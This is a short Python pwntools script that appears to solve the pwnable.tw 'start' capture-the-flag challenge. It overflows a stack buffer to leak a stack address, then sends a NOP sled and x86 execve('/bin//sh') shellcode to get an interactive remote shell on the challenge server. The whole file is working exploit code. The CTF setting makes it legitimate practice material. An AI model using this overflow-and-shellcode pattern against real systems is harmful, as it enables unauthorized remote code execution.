# encoding=utf-8

from pwnlib import *

if __name__ == "__main__":

    util.packing.p32()
    junk = "a" * 20
    write_addr = 0x08048087
    shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
    rop_addr = junk + p32(write_addr)  # 控制函数返回到mov ecx,esp处，从而打印出栈地址
    # io = process('./start')
    io = tubes.remote('chall.pwnable.tw', 10000)
    io.recvuntil("CTF:")
    io.send(rop_addr)
    shell_addr = u32(io.recv(4)) + 20
    rop_shell = junk + p32(shell_addr) + '\x90' * 4 + shellcode
    io.send(rop_shell)
    io.recv()
    io.interactive()